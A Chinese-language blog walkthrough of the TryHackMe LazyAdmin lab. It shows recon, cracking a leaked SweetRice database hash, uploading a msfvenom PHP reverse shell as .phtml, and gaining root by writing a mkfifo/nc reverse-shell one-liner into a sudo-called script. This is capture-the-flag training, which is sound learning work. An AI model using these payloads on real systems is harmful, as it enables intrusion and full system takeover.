---
title: "THM LazyAdmin"
description: "TryHackMe篇之LazyAdmin"

date: 2024-10-01T13:21:11+08:00
lastmod: 2025-11-11T10:41:44+08:00

math: true
mermaid: true

categories:
  - TryHackMe
tags:
  - Linux
---
<!--more-->

> 靶机ip：10.10.36.50

# 信息收集

## nmap扫描

`nmap -sS -sV -sC 10.10.36.50 -o out.txt`

```text
# Nmap 7.94SVN scan initiated Tue Oct  1 13:28:01 2024 as: nmap -sS -sV -sC -o out.txt 10.10.36.50
Nmap scan report for 10.10.36.50
Host is up (0.34s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 49:7c:f7:41:10:43:73:da:2c:e6:38:95:86:f8:e0:f0 (RSA)
|   256 2f:d7:c4:4c:e8:1b:5a:90:44:df:c0:63:8c:72:ae:55 (ECDSA)
|_  256 61:84:62:27:c6:c3:29:17:dd:27:45:9e:29:cb:90:5e (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct  1 13:28:39 2024 -- 1 IP address (1 host up) scanned in 38.00 seconds
```

发现只有 22端口和80端口开放

## 80端口

![image-20241001133315429](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001133324081-920118799.png)

80端口是一个apache初始页面什么也没有，扫描一下目录

`gobuster dir -u http://10.10.36.50/ -w /usr/share/wordlists/dirb/common.txt`

![image-20241001134437572](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001134445161-1128622157.png)

发现`/content`路由，访问一下

![image-20241001140337721](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001140344879-280931777.png)

发现是`SweetRice`站点，继续扫描目录

`gobuster dir -u http://10.10.36.50/content -w /usr/share/wordlists/dirb/common.txt`

![image-20241001140550777](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001140558172-1591267814.png)

这回发现了一些有意思的内容

在`/_themes`下，发现一些查看不了源码的php文件，并没有什么用

![image-20241001140731314](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001140738542-1427503327.png)

在`/as`路由下找到登录口

![image-20241001140813239](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001140820110-1638822951.png)

`/attachment`路由下并没有什么信息

![image-20241001140855448](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001140902177-336260211.png)

这里直接看`/inc`路由

![image-20241001141008810](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001141015730-1826348733.png)

很明显看到数据库备份文件夹，将里面的`sql`文件下载到本地查看

![image-20241001141134169](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001141141471-910671197.png)

发现该cms版本为1.5.1，且密码也有，用户名是`manager`，尝试hashcat破解密码，将密码保存为`passwd`

`hashcat -a 0 -m 0 passwd /usr/share/wordlists/rockyou.txt`

![image-20241001141723708](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001141730815-751946977.png)

发现成功破解密码，密码是`Password123`

尝试通过`as`路由登录`manager`账户

![image-20241001141925338](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001141932514-1784118097.png)

登录成功，同时可以确认该cms版本号为1.5.1

# MSF获取权限

启动msf，`search`一下该cms，看看能否有可以直接利用的漏洞



![image-20241001142409002](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001142416137-2123494996.png)

很可惜，没有可以直接用的，但是`searchsploit`发现了可以利用的，其中`Backup Disclosure`我们之前手动实现了，并登陆到了后台

![image-20241001142440531](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001142447599-1728977571.png)

但是我们可以利用其他的，比如`Arbitrary File Upload`，我们可以通过这个漏洞上传shell，这里使用msf进行反弹shell

先使用msf创建一个监听

```shell
use exploit/multi/handler	# 使用 exploit/multi/handler 模块
set  payload php/meterpreter/reverse_tcp	# 设置php的攻击负载payload
```

![image-20241001143744773](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001143752057-1728671297.png)

将需要的选项填好

![image-20241001143810923](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001143817667-1736957141.png)

设置好监听器后，生成php反弹shell

`msfvenom -p php/meterpreter/reverse_tcp lhost=10.11.101.220   lport=4444 R>shell.php`

![image-20241001144922924](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001144930162-200383647.png)

在`http://10.10.36.50/content/as/?type=media_center`处，将文件传上去

传`.php`文件时，发现并没有反应，将文件后缀改为`.phtml`，成功上传

![image-20241001145337432](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001145344237-1734699769.png)

在msf中`run`执行，在点击当前页面的`shell.phtml`文件，此时发现shell成功弹回来了

![image-20241001150634947](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001150642271-505446254.png)

换成交互式shell

`python -c 'import pty;pty.spawn("/bin/bash")'`

![image-20241001150820149](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001150826924-1862349482.png)

在`/home/itguy`下找到`user.txt`

# 权限提升

输入`sudo -l`查看是否有可以利用了命令

![image-20241001151243232](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001151250536-1508069797.png)

只发现了一条

`(ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl`

查看一下`backup.pl`文件

![image-20241001151353310](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001151400028-565050480.png)

发现只是调用`/etc/copy.sh`文件

![image-20241001151555700](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001151602948-2027858445.png)

通过仔细查看两个文件后发现，我们不能修改`backup.pl`但是可以改`/etc/copy.sh`文件的内容

![image-20241001151753242](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001151800210-1044518594.png)

查看`/etc/copy.sh`文件后发现，内容是反弹shell的命令，将其修改成自己的ip和port

`echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.11.101.220 4445 >/tmp/f" >/etc/copy.sh`

另起一个监听

![image-20241001153444215](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001153450910-287086362.png)

在msf终端shell里执行命令

`sudo /usr/bin/perl /home/itguy/backup.pl`

![image-20241001153541191](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001153547891-1980282670.png)

![image-20241001153853757](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001153900832-1299349622.png)

可以看到在新的shell里获得了root权限

![image-20241001153949813](https://cdn.jsdelivr.net/gh/Ya1orin/Blog-images/uploads/3051266-20241001153956587-989090601.png)

最后在`/root`下找到`root.txt`

